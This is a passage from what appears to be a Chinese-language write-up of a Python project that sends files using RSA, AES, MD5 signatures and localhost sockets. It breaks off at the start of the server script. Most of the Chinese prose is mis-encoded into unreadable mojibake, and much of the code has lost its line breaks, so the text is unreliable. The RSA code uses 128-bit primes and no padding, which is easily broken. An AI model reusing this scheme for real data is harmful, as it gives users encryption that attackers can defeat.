æ­¤æ±‚è§£dçš„è¿‡ç¨‹å°±æ˜¯æ±‚è§£è¯¥äºŒå…ƒä¸€æ¬¡æ–¹ç¨‹ç»„ï¼ˆeå’Œmå·²çŸ¥ï¼Œæ±‚è§£dï¼‰ï¼Œå³æ±‚eæ¨¡mçš„é€†å…ƒã€‚</p><p>ä½¿ç”¨æ¬§å‡ é‡Œå¾—æ‰©å±•ç®—æ³•æ±‚é€†å…ƒ(è¾—è½¬ç›¸é™¤æ³•)</p><blockquote><p>ç»™å®šæ¨¡æ•°mï¼Œæ±‚açš„é€†ç›¸å½“äºæ±‚è§£ax=1(mod m)<br>è¿™ä¸ªæ–¹ç¨‹å¯ä»¥è½¬åŒ–ä¸ºax-my=1<br>ç„¶åå¥—ç”¨æ±‚äºŒå…ƒä¸€æ¬¡æ–¹ç¨‹çš„æ–¹æ³•ï¼Œç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å¾—ä¸€ç»„x0,y0å’Œgcd<br>æ£€æŸ¥gcdæ˜¯å¦ä¸º1<br>gcdä¸ä¸º1åˆ™è¯´æ˜é€†å…ƒä¸å­˜åœ¨<br>è‹¥ä¸º1ï¼Œåˆ™è°ƒæ•´x0åˆ°0~m-1çš„èŒƒå›´ä¸­å³å¯</p></blockquote><p>å…·ä½“ä»£ç å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caculateD</span>(<span class="hljs-params">a, m</span>):</span>    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:        q = u3//v3        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3    <span class="hljs-keyword">return</span> u1%m</code></pre><h3 id="3-2-4åŠ è§£å¯†è¿‡ç¨‹"><a href="#3-2-4åŠ è§£å¯†è¿‡ç¨‹" class="headerlink" title="3.2.4åŠ è§£å¯†è¿‡ç¨‹"></a>3.2.4åŠ è§£å¯†è¿‡ç¨‹</h3><p>æœ‰äº†ä»¥ä¸Šçš„åŸºç¡€ï¼ŒRSAçš„åŠ è§£å¯†å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥å¥—ç”¨å…¬å¼å³å¯ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSAEncode</span>(<span class="hljs-params">m, e, n</span>):</span>               <span class="hljs-comment"># åŠ å¯†å…¬å¼ m^e mod n</span>    m = <span class="hljs-built_in">int</span>(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶</span>    c = fast_mod(m, e, n)    <span class="hljs-keyword">return</span> c<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSADecode</span>(<span class="hljs-params">c, d, n</span>):</span>                 <span class="hljs-comment"># åŠ å¯†å…¬å¼ c^d mod n</span>    plaintext = fast_mod(c,d,n)    plaintext = <span class="hljs-built_in">str</span>(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># å°†æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦</span>    <span class="hljs-keyword">return</span> plaintext</code></pre><h3 id="3-2-5-æ­£ç¡®æ€§éªŒè¯"><a href="#3-2-5-æ­£ç¡®æ€§éªŒè¯" class="headerlink" title="3.2.5 æ­£ç¡®æ€§éªŒè¯"></a>3.2.5 æ­£ç¡®æ€§éªŒè¯</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714112147375.png" alt="image-20210714112147375"></p><h2 id="3-3-AES"><a href="#3-3-AES" class="headerlink" title="3.3 AES"></a>3.3 AES</h2><p>AESåŠ å¯†ç®—æ³•åŒDESç›¸åŒéƒ½æ˜¯åˆ†ç»„åŠ å¯†ç®—æ³•ï¼ŒAESæ˜¯å¯¹128ä½æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥ä¹Ÿæ˜¯128ä½ï¼ŒåŠ å¯†åäº§ç”Ÿ128ä½çš„å¯†æ–‡ï¼ŒAESçš„åŠ å¯†è½®æ•°ä¸º10è½®ï¼Œæ˜æ–‡å’Œå¯†é’¥éƒ½è¢«åˆ†ä¸º4ç»„ï¼Œæ¯ç»„32bitã€‚</p><p>AESä¸ºåˆ†ç»„å¯†ç ï¼Œæ¯ç»„é•¿åº¦ç›¸ç­‰ï¼Œæ¯æ¬¡åŠ å¯†ä¸€ç»„æ•°æ®ï¼Œç›´åˆ°åŠ å¯†å®Œæ•´ä¸ªæ˜æ–‡ã€‚ åœ¨AESæ ‡å‡†è§„èŒƒä¸­ï¼Œåˆ†ç»„é•¿åº¦åªèƒ½æ˜¯128ä½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªåˆ†ç»„ä¸º16ä¸ªå­—èŠ‚ï¼ˆæ¯ä¸ªå­—èŠ‚8ä½ï¼‰ã€‚ å¯†é’¥çš„é•¿åº¦å¯ä»¥ä½¿ç”¨128ä½ã€192ä½æˆ–256ä½ç”šè‡³æ›´å¤šï¼Œå¯†é’¥çš„é•¿åº¦ä¸åŒï¼ŒåŠ å¯†è½®æ•°ä¹Ÿä¸åŒï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBH6RhpI7rCO40v6jTJQXokGB0JSjuEreiaDBQiaE3PhUjALYSd8iaaa6Ppg/640?wx_fmt=png" alt="img" style="zoom:67%;"><p>ä»¥ä¸‹ä»¥AES-128ä¸ºä¾‹è¿›è¡Œé˜è¿°ï¼ŒAESçš„åŠ å¯†å…¬å¼ä¸ºC = E(K,P)ï¼Œåœ¨åŠ å¯†å‡½æ•°Eä¸­ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªè½®å‡½æ•°ï¼Œå¹¶ä¸”æ‰§è¡Œ10æ¬¡è¿™ä¸ªè½®å‡½æ•°ï¼Œè¿™ä¸ªè½®å‡½æ•°çš„å‰9æ¬¡æ‰§è¡Œçš„æ“ä½œæ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œåªæœ‰ç¬¬10æ¬¡ç•¥æœ‰ä¸åŒï¼Œå³æ¯ä¸ªæ˜æ–‡åˆ†ç»„ä¼šè¿›è¡Œ10è½®åŠ å¯†ã€‚</p><p>AESçš„å¤„ç†å•ä½æ˜¯å­—èŠ‚ï¼Œ128ä½çš„è¾“å…¥æ˜æ–‡åˆ†ç»„På’Œè¾“å…¥å¯†é’¥Kéƒ½è¢«åˆ†æˆ16ä¸ªå­—èŠ‚ï¼Œåˆ†åˆ«è®°ä¸ºP = P0 P1 â€¦ P15 å’Œ K = K0 K1 â€¦ K15ã€‚æ˜æ–‡åˆ†ç»„ç”¨å­—èŠ‚ä¸ºå•ä½çš„æ­£æ–¹å½¢çŸ©é˜µæè¿°ï¼Œç§°ä¸ºçŠ¶æ€çŸ©é˜µã€‚åœ¨ç®—æ³•çš„æ¯ä¸€è½®ä¸­ï¼ŒçŠ¶æ€çŸ©é˜µçš„å†…å®¹ä¸æ–­å‘ç”Ÿå˜åŒ–ï¼Œæœ€åçš„ç»“æœä½œä¸ºå¯†æ–‡è¾“å‡ºã€‚</p><p>è¯¥çŸ©é˜µä¸­å­—èŠ‚çš„æ’åˆ—é¡ºåºä¸ºä»ä¸Šåˆ°ä¸‹ã€ä»å·¦è‡³å³ä¾æ¬¡æ’åˆ—ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHF1pHbI1nHibCjVCkiaABCdlYBgwBeRYIESbGfNzXNaOWsBvib8O9Wfqfw/640?wx_fmt=png" alt="img" style="zoom:67%;"><p>åŒæ ·ï¼Œ128ä½å¯†é’¥ä¹Ÿæ˜¯ç”¨å­—èŠ‚ä¸ºå•ä½çš„çŸ©é˜µè¡¨ç¤ºï¼ŒçŸ©é˜µçš„æ¯ä¸€åˆ—è¢«ç§°ä¸º1ä¸ª32ä½æ¯”ç‰¹å­—ã€‚é€šè¿‡å¯†é’¥ç¼–æ’å‡½æ•°è¯¥å¯†é’¥çŸ©é˜µè¢«æ‰©å±•æˆä¸€ä¸ª44ä¸ªå­—ç»„æˆçš„åºåˆ—W[0],W[1], â€¦ ,W[43],è¯¥åºåˆ—çš„å‰4ä¸ªå…ƒç´ W[0],W[1],W[2],W[3]æ˜¯åŸå§‹å¯†é’¥ï¼Œç”¨äºåŠ å¯†è¿ç®—ä¸­çš„åˆå§‹è½®å¯†é’¥åŠ ï¼ˆä¸‹é¢ä»‹ç»ï¼‰;åé¢40ä¸ªå­—åˆ†ä¸º10ç»„ï¼Œæ¯ç»„4ä¸ªå­—ï¼ˆ128æ¯”ç‰¹ï¼‰åˆ†åˆ«ç”¨äº10è½®åŠ å¯†è¿ç®—ä¸­çš„è½®å¯†é’¥åŠ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHQeib23GZYgQZIqx0Iy86MBjEWsJia4m5ggOUwoOLBQsic3nJKGicHdIicUQ/640?wx_fmt=png" alt="img" style="zoom:67%;"><p>ä¸Šå›¾ä¸­ï¼ŒW[0] = K0 K1 K2 K3 ã€‚</p><p>AESåŠ å¯†ç®—æ³•ä¸»è¦æ­¥éª¤æœ‰ï¼š</p><ul><li>è½®å¯†é’¥åŠ ï¼šAddRoundKey</li><li>å­—èŠ‚æ›¿ä»£ï¼šByteSub</li><li>è¡Œç§»ä½ï¼š ShiftRow</li><li>åˆ—æ··è‚´ï¼š MixColumns</li></ul><p>AESçš„æ•´ä½“ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­çš„W[0,3]æ˜¯æŒ‡W[0]ã€W[1]ã€W[2]å’ŒW[3]ä¸²è”ç»„æˆçš„128ä½å¯†é’¥ã€‚åŠ å¯†çš„ç¬¬1è½®åˆ°ç¬¬9è½®çš„è½®å‡½æ•°ä¸€æ ·ï¼ŒåŒ…æ‹¬4ä¸ªæ“ä½œï¼šå­—èŠ‚ä»£æ¢ã€è¡Œä½ç§»ã€åˆ—æ··åˆå’Œè½®å¯†é’¥åŠ ã€‚æœ€åä¸€è½®è¿­ä»£ä¸æ‰§è¡Œåˆ—æ··åˆã€‚å¦å¤–ï¼Œåœ¨ç¬¬ä¸€è½®è¿­ä»£ä¹‹å‰ï¼Œå…ˆå°†æ˜æ–‡å’ŒåŸå§‹å¯†é’¥è¿›è¡Œä¸€æ¬¡å¼‚æˆ–åŠ å¯†æ“ä½œã€‚</p><img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHDcPhfyYMVWsnJsXicITn1hcicXblmtgmrqOZLwYGWpgetngmZM3vI4cQ/640?wx_fmt=png" alt="img" style="zoom:67%;"><p>ä¸‹é¢åˆ†åˆ«ä»‹ç»AESä¸­ä¸€è½®çš„æ“ä½œé˜¶æ®µï¼Œè¿™äº›æ“ä½œé˜¶æ®µä½¿è¾“å…¥ä½å¾—åˆ°å……åˆ†çš„æ··æ·†ã€‚</p><h3 id="3-3-1-å­—èŠ‚ä»£æ¢"><a href="#3-3-1-å­—èŠ‚ä»£æ¢" class="headerlink" title="3.3.1 å­—èŠ‚ä»£æ¢"></a>3.3.1 å­—èŠ‚ä»£æ¢</h3><p>â€‹        AESçš„å­—èŠ‚æ›¿æ¢ï¼Œæœ¬è´¨ä¸Šå’ŒDESçš„Sç›’æ›¿æ¢æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯æ ¹æ®è¾“å…¥å­—èŠ‚æŸ¥è¡¨æ¥è·å¾—å¯¹åº”çš„è¾“å‡ºå­—èŠ‚ï¼Œä¸åŒçš„æ˜¯ï¼ŒAESçš„Sç›’è§„æ ¼æ˜¯16*16çš„å­—èŠ‚çŸ©é˜µã€‚å› æ­¤ï¼Œå­—èŠ‚æ›¿æ¢æ­¥éª¤ä¹Ÿæ˜¯AESç®—æ³•è½®å‡½æ•°çš„å…³é”®ï¼Œç›¸è¾ƒäºå…¶ä»–è¿ç®—æ­¥éª¤çš„çº¿æ€§ç‰¹å¾è€Œæ˜“äºåˆ†æï¼ŒSç›’çš„éçº¿æ€§æä¾›äº†æ›´å¥½çš„å®‰å…¨æ€§ã€‚<br>â€‹        å­—èŠ‚æ›¿æ¢çš„è§„åˆ™æ˜¯ï¼Œå°†çŠ¶æ€çŸ©é˜µä¸­çš„æ¯ä¸ªå­—èŠ‚çš„é«˜4ä½ä½œä¸ºè¡Œå€¼ï¼Œä½4ä½ä½œä¸ºåˆ—å€¼ï¼Œå–å‡ºSç›’ä¸­å¯¹åº”çš„çŸ©é˜µå­—èŠ‚å…ƒç´ ä½œä¸ºæ›¿æ¢å­—èŠ‚ã€‚ä¾‹å¦‚çŠ¶æ€çŸ©é˜µä¸­æŸä¸ªè¾“å…¥å­—èŠ‚å€¼ä¸º0x6bï¼ˆ01101011ï¼‰ï¼Œé‚£ä¹ˆè¡Œå€¼ä¸º6ï¼ˆ0110ï¼‰ï¼Œåˆ—å€¼ä¸ºbï¼ˆ1011ï¼‰ï¼ŒæŸ¥è¯¢å¦‚è¡¨4.1æ‰€ç¤ºSç›’ï¼Œå¾—åˆ°çš„è¾“å‡ºå­—èŠ‚ä¸º0x7f(01111111)</p><p>â€‹        ç»è¿‡è¯¥æ­¥éª¤çš„å­—èŠ‚æ›¿æ¢ä¹‹åï¼Œè¾“å…¥çš„4*4å­—èŠ‚çŠ¶æ€çŸ©é˜µä¸­çš„æ¯ä¸ªå­—èŠ‚å…ƒç´ éƒ½è¢«æ–°å­—èŠ‚æ›¿ä»£ï¼Œå¾—åˆ°çš„æ–°çŠ¶æ€çŸ©é˜µå°†ä½œä¸ºä¸‹ä¸€æ­¥è¡Œç§»ä½çš„è¾“å…¥ã€‚</p><h3 id="3-3-2-è¡Œç§»ä½"><a href="#3-3-2-è¡Œç§»ä½" class="headerlink" title="3.3.2 è¡Œç§»ä½"></a>3.3.2 è¡Œç§»ä½</h3><p>è¡Œç§»ä½æ­¥éª¤å¯¹è¾“å…¥çš„çŠ¶æ€çŸ©é˜µè¿›è¡Œç®€å•çš„è¡Œå¾ªç¯ç§»ä½æ“ä½œï¼ˆä¸åŒè¡Œçš„ç§»ä½æ•°ä¸åŒï¼Œå…·ä½“ç§»ä½æ•°ç”±ç®—æ³•è¾“å…¥å†³å®šï¼‰ï¼Œæœ¬æ–‡ä»¥ç¬¬å‡ è¡Œå·¦ç§»å‡ ä¸ªå­—èŠ‚ä¸ºä¾‹ï¼Œè¡Œç§»ä½è¿‡ç¨‹å¦‚å›¾5.1æ‰€ç¤ºï¼Œç§»ä½å®Œæˆä¹‹åå¾—åˆ°çš„æ–°çŠ¶æ€çŸ©é˜µå°†ä½œä¸ºä¸‹ä¸€æ­¥åˆ—æ··åˆçš„è¾“å…¥ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114322729.png" alt="image-20210714114322729" style="zoom:67%;"><h3 id="3-3-3-åˆ—æ··æ·†"><a href="#3-3-3-åˆ—æ··æ·†" class="headerlink" title="3.3.3 åˆ—æ··æ·†"></a>3.3.3 åˆ—æ··æ·†</h3><p>åˆ—æ··åˆåŸºäºçŸ©é˜µä¹˜æ³•å®ç°ï¼Œä½¿å¾—çŠ¶æ€çŸ©é˜µä¸­çš„æ¯ä¸€åˆ—çš„å„ä¸ªå…ƒç´ ä¹‹é—´æŒ‰ç…§é¢„å…ˆå®šä¹‰çš„åˆ—æ··åˆåŠ å¯†çŸ©é˜µçš„æƒé‡æ¥äº§ç”Ÿç›¸äº’æ··æ·†çš„å½±å“ï¼Œäº§ç”Ÿåˆ—å…ƒç´ äº’ç›¸ä¹‹é—´è¢«æ··åˆçš„æ–°çŠ¶æ€çŸ©é˜µã€‚<br>ä¾‹å¦‚ï¼Œæ ¹æ®å…¬å¼6.1è¿›è¡Œåˆ—æ··åˆåŠ å¯†ï¼Œç¬¬0è¡Œç¬¬0åˆ—å…ƒç´ çš„è¾“å‡ºè®¡ç®—è¡¨ç¤ºä¸ºï¼š</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114422682.png" alt="image-20210714114422682" style="zoom: 80%;"><p>è¯¥å…ƒç´ å°†ç¬¬0åˆ—æ‰€æœ‰å…ƒç´ æŒ‰é¢„è®¾æƒé‡æ··åˆèµ·æ¥ã€‚</p><p><strong>[æ³¨æ„]</strong>ï¼šè¯¥å…¬å¼ä¸­çš„ä¹˜æ³•å’ŒåŠ æ³•ä¸æ˜¯æ™®é€šæ•°å­¦æ„ä¹‰çš„ä¹˜å’ŒåŠ ï¼Œè€Œæ˜¯æœ‰é™åŸŸGF(2^8)å››åˆ™è¿ç®—ä¸­çš„ä¹˜å’ŒåŠ ï¼ŒåŠ æ³•å³æ˜¯æŒ‰ä½å¼‚æˆ–ï¼Œä¹˜æ³•è¾ƒä¸ºå¤æ‚ï¼Œæ­¤å¤„ä¸åšèµ˜è¿°ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è¿›ä¸€æ­¥äº†è§£æœ‰é™åŸŸçš„ç›¸å…³çŸ¥è¯†ã€‚</p><p>å…¶ä»–è¡Œåˆ—çš„è®¡ç®—å…¬å¼</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114520386.png" alt="image-20210714114520386" style="zoom:80%;"><p>AESè½®å‡½æ•°ä¸­çš„æ‰€æœ‰å››ä¸ªæ­¥éª¤éƒ½æ˜¯å¯é€†å˜æ¢ï¼Œé‚£ä¹ˆåˆ—æ··åˆå…¬å¼å¦‚ä¸‹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114616930.png" alt="image-20210714114616930" style="zoom:80%;"><h3 id="3-3-4-è½®å¯†é’¥åŠ "><a href="#3-3-4-è½®å¯†é’¥åŠ " class="headerlink" title="3.3.4 è½®å¯†é’¥åŠ "></a>3.3.4 è½®å¯†é’¥åŠ </h3><p>è½®å¯†é’¥åŠ çš„è¿‡ç¨‹ååˆ†ç®€å•ï¼Œå°±æ˜¯å°†åˆ—æ··åˆè¾“å‡ºçš„çŠ¶æ€çŸ©é˜µï¼ˆå…±128ä½ï¼‰å’Œå¯†é’¥æ‰©å±•å¾—åˆ°çš„æœ¬è½®è½®å¯†é’¥ï¼ˆå…±128ä½ï¼‰è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ï¼Œå¾—åˆ°æœ€ç»ˆçš„æœ¬è½®çŠ¶æ€çŸ©é˜µè¾“å‡ºã€‚</p><h3 id="3-3-5-å¯†é’¥æ‰©å±•"><a href="#3-3-5-å¯†é’¥æ‰©å±•" class="headerlink" title="3.3.5 å¯†é’¥æ‰©å±•"></a>3.3.5 å¯†é’¥æ‰©å±•</h3><p>ä¸æ˜æ–‡åˆ†ç»„çŸ©é˜µä¸€æ ·ï¼Œå¯†é’¥æ‰©å±•ä¹Ÿæ˜¯ä»¥8æ¯”ç‰¹å­—èŠ‚ä½œä¸ºå•ä½å¯¹ä¸»å¯†é’¥è¿›è¡Œå¤„ç†ï¼Œ128ä½ä¸»å¯†é’¥å¯ä»¥è¡¨ç¤ºä¸ºK=[K0,K1,â€¦,K15]çš„4*4å­—èŠ‚çŸ©é˜µã€‚ç»è¿‡å¯†é’¥æ‰©å±•å‡½æ•°ï¼ŒKæ‰©å±•ä¸º44åˆ—çš„è½®å¯†é’¥å­—çŸ©é˜µï¼ˆå…¶ä¸­ä¸€ä¸ªå­—ä¸º4å­—èŠ‚32ä½ï¼‰ï¼Œè¡¨ç¤ºä¸ºW=[W0,W1,â€¦W43]ã€‚æ¯ä¸€è½®ä¾æ¬¡å–å‡ºå‰4ä¸ªå­—ï¼ˆ128ä½ï¼‰ä½œä¸ºæœ¬è½®è½®å¯†é’¥ï¼Œå¦‚åˆå§‹è½®è½®å¯†é’¥ä¸ºW[0,3]=[W0,W1,W2,W3]ã€‚å¯†é’¥æ‰©å±•çš„è¿‡ç¨‹å¦‚å›¾</p><h3 id="3-3-6-æ­£ç¡®æ€§éªŒè¯"><a href="#3-3-6-æ­£ç¡®æ€§éªŒè¯" class="headerlink" title="3.3.6 æ­£ç¡®æ€§éªŒè¯"></a>3.3.6 æ­£ç¡®æ€§éªŒè¯</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714121451444.png" alt="image-20210714121451444"></p><h2 id="3-4-socketé€šä¿¡"><a href="#3-4-socketé€šä¿¡" class="headerlink" title="3.4 socketé€šä¿¡"></a>3.4 socketé€šä¿¡</h2><p>Socketåˆç§°â€å¥—æ¥å­—â€ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡â€å¥—æ¥å­—â€å‘ç½‘ç»œå‘å‡ºè¯·æ±‚æˆ–è€…åº”ç­”ç½‘ç»œè¯·æ±‚ï¼Œä½¿ä¸»æœºé—´æˆ–è€…ä¸€å°è®¡ç®—æœºä¸Šçš„è¿›ç¨‹é—´å¯ä»¥é€šè®¯ã€‚</p><p>è¯¥é¡¹ç›®ä¸­çš„é€šä¿¡æµç¨‹ï¼š</p><img src="/2021/07/21/RSA-AES/Sunzh/%E4%BF%9D%E7%A0%94%E7%9B%B8%E5%85%B3/%E8%A5%BF%E5%B7%A5/%E8%80%83%E6%A0%B8/%E7%BB%98%E5%9B%BE1.png" alt="ç»˜å›¾1" style="zoom:67%;"><p>serverç»‘å®šipå’Œç«¯å£</p><pre><code class="hljs python">server = socket.socket() <span class="hljs-comment">#åˆ›å»ºå¯¹è±¡server.bind((&quot;localhost&quot;,8888))#ç»‘å®š ipå’Œç«¯å£server.listen()  #ç›‘å¬con,addr = server.accept()</span></code></pre><p>clientåˆ›å»ºsocketè¿æ¥server</p><pre><code class="hljs python">client = socket.socket()client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># æœåŠ¡å™¨IPåœ°å€å’Œç«¯å£</span></code></pre><h2 id="3-5-æ•°å­—ç­¾å"><a href="#3-5-æ•°å­—ç­¾å" class="headerlink" title="3.5 æ•°å­—ç­¾å"></a>3.5 æ•°å­—ç­¾å</h2><p>â€‹        æ•°å­—ç­¾åï¼ˆåˆç§°å…¬é’¥æ•°å­—ç­¾åï¼‰æ˜¯åªæœ‰ä¿¡æ¯çš„å‘é€è€…æ‰èƒ½äº§ç”Ÿçš„åˆ«äººæ— æ³•ä¼ªé€ çš„ä¸€æ®µæ•°å­—ä¸²ï¼Œè¿™æ®µæ•°å­—ä¸²åŒæ—¶ä¹Ÿæ˜¯å¯¹ä¿¡æ¯çš„å‘é€è€…å‘é€ä¿¡æ¯çœŸå®æ€§çš„ä¸€ä¸ªæœ‰æ•ˆè¯æ˜ã€‚å®ƒæ˜¯ä¸€ç§ç±»ä¼¼å†™åœ¨çº¸ä¸Šçš„æ™®é€šçš„ç‰©ç†ç­¾åï¼Œä½†æ˜¯ä½¿ç”¨äº†å…¬é’¥åŠ å¯†é¢†åŸŸçš„æŠ€æœ¯æ¥å®ç°çš„ï¼Œç”¨äºé‰´åˆ«æ•°å­—ä¿¡æ¯çš„æ–¹æ³•ã€‚ä¸€å¥—æ•°å­—ç­¾åé€šå¸¸å®šä¹‰ä¸¤ç§äº’è¡¥çš„è¿ç®—ï¼Œä¸€ä¸ªç”¨äºç­¾åï¼Œå¦ä¸€ä¸ªç”¨äºéªŒè¯ã€‚æ•°å­—ç­¾åæ˜¯éå¯¹ç§°å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸æ•°å­—æ‘˜è¦æŠ€æœ¯çš„åº”ç”¨ã€‚</p><p>å®ç°åŸç†å¦‚å›¾ï¼š</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.png" alt="æ•°å­—ç­¾å"></p><h1 id="å››ã€ç¨‹åºå®ç°"><a href="#å››ã€ç¨‹åºå®ç°" class="headerlink" title="å››ã€ç¨‹åºå®ç°"></a>å››ã€ç¨‹åºå®ç°</h1><p>***åŠ å¯†ç®—æ³•çš„ä»£ç æ”¾åœ¨å¦å¤–çš„æ–‡ä»¶ä¸­</p><p>æœ‰äº†ä¸Šé¢çš„åŸç†æ”¯æ’‘ï¼Œæ•´ä¸ªç³»ç»Ÿå°±å¯ä»¥å®Œæˆäº†ï¼Œé¦–å…ˆçœ‹ä¸‹æ•´ä¸ªä¼ è¾“ç³»ç»Ÿçš„å·¥ä½œè¿‡ç¨‹ã€‚</p><p>ç¨‹åºæ•´ä½“æµç¨‹å¦‚ä¸‹å›¾ï¼š</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714213527284.png" alt="image-20210714213527284" style="zoom:80%;"><p>å…·ä½“å®ç°ï¼Œæ‰€æœ‰æ–‡ä»¶å¦‚ä¸‹</p><pre><code class="hljs reasonml">â”œâ”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AES</span>.</span></span>py    â”œâ”€â”€ alice_Client.py  <span class="hljs-comment">//æ•°æ®å‘é€æ–¹</span>â”œâ”€â”€ bob_Server.py    <span class="hljs-comment">//æ•°æ®æ¥æ”¶æ–¹</span>â”œâ”€â”€ data     <span class="hljs-comment">// éœ€è¦ä¼ è¾“çš„å…«æ¡æ•°æ®ï¼Œè¿™é‡Œä½¿ç”¨æ–‡ä»¶å­˜å‚¨</span>â”‚Â Â  â”œâ”€â”€ test0.txtâ”‚Â Â  â”œâ”€â”€ test1.txtâ”‚Â Â  â”œâ”€â”€ test2.txtâ”‚Â Â  â”œâ”€â”€ test3.txtâ”‚Â Â  â”œâ”€â”€ test4.txtâ”‚Â Â  â”œâ”€â”€ test5.txtâ”‚Â Â  â”œâ”€â”€ test6.txtâ”‚Â Â  â””â”€â”€ test7.txtâ”œâ”€â”€ file_decode.py   <span class="hljs-comment">// RSAå…¬ç§é’¥ç”Ÿæˆå’Œæ–‡ä»¶è¯»å–</span>â”œâ”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MD5</span>.</span></span>py â””â”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RSA</span>.</span></span>py</code></pre><h2 id="file-decode-py"><a href="#file-decode-py" class="headerlink" title="file_decode.py"></a>file_decode.py</h2><p>è¯¥å‡½æ•°ä¸»è¦ä½œç”¨æœ‰ä¸¤ä¸ª</p><ul><li>è¯»å–æ–‡ä»¶å†…å®¹</li><li>ç”ŸæˆRSAç®—æ³•çš„nï¼Œå¹¶è®¡ç®—å‡ºdï¼ˆæ¯æ¬¡ä¼ è¾“æ—¶ï¼Œä½¿ç”¨çš„néƒ½ä¸ä¸€æ ·ï¼Œç®—æ˜¯ä¸€ç§ä¸€æ¬¡ä¸€å¯†æœºåˆ¶ï¼Œå¯ä»¥æé«˜å®‰å…¨æ€§ï¼‰</li></ul><pre><code class="hljs python"><span class="hljs-keyword">import</span> randomimport refrom RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> AES <span class="hljs-keyword">import</span> *e = 65537def read_file(num):    path = <span class="hljs-string">&#x27;.\data\\test&#x27;</span>+<span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;.txt&#x27;</span>    <span class="hljs-keyword">try</span>:        f = <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)        text = f.read()        f.close()        print(<span class="hljs-string">&quot;è¯»å–æˆåŠŸ!&quot;</span>)        <span class="hljs-keyword">return</span> text    <span class="hljs-keyword">except</span> IOError:        print(<span class="hljs-string">&quot;è¯»å–é”™è¯¯!&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n_and_d</span>():</span>    p = genPrime(<span class="hljs-number">128</span>)    q = genPrime(<span class="hljs-number">128</span>)    phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)    n = p*q    d = caculateD(e,phi)    print(<span class="hljs-string">&quot;ç”Ÿæˆçš„p:&quot;</span>,p)    print(<span class="hljs-string">&quot;ç”Ÿæˆçš„q:&quot;</span>,q)    <span class="hljs-keyword">return</span> n,d</code></pre><h2 id="bob-server-py"><a href="#bob-server-py" class="headerlink" title="bob_server.py"></a>bob_server.py</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span 